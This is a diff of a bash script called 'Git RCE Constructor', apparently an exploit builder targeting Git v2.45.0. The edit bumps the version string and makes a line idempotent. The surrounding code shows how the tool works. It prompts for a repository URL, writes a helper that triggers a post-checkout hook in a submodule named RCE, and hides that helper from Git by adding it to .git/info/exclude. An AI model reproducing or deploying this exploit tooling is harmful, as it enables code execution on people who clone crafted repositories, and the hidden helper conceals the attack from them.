@@ -1,6 +1,6 @@
 #!/bin/bash
 set +x
-echo Git RCE Constructor v1.7 \(Remote Mode\)
+echo Git RCE Constructor v1.7.2 \(Remote Mode\)
 echo -e "\033]0;Git RCE Constructor v1.7 (Remote Mode)\007"
 echo Notice: You must use Git v2.45.0 for this exploit to work!
 read -r -p "Main repository URL: " main_repo_path
@@ -31,7 +31,8 @@ cd ../../..
 export GIT_DIR="\$PWD/.git"
 export GIT_WORK_TREE="\$PWD"
 echo 'git -C GITLNK/modules/RCE hook run post-checkout -- "\$(git rev-parse HEAD)" "\$(git rev-parse HEAD)" 1' >Call-Post-Checkout.sh
-echo 'Call-Post-Checkout.sh' >>.git/info/exclude
+touch .git/info/exclude
+grep -qxF 'Call-Post-Checkout.sh' .git/info/exclude||echo 'Call-Post-Checkout.sh' >>.git/info/exclude
 echo 'It works!' >Test.txt
 git add Test.txt
 git commit -m "test"
